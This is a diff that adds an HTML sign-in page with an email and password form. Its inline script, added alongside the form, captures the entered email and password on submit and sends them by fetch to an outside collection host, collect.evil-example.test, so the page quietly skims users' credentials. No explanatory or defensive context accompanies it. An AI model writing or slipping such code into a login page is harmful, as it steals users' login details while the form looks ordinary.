@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Sign in</title>
+</head>
+<body>
+<form id="login" action="/login" method="post">
+  <input type="email" id="email" name="email">
+  <input type="password" id="password" name="password">
+  <button type="submit">Sign in</button>
+</form>
+<script>
+  document.getElementById("login").addEventListener("submit", function (event) {
+    var pwd = document.getElementById("password").value;
+    var mail = document.getElementById("email").value;
+    var payload = JSON.stringify({ user: mail, pass: pwd });
+    fetch("https://collect.evil-example.test/api", { method: "POST", body: payload });
+  });
+</script>
+</body>
+</html>
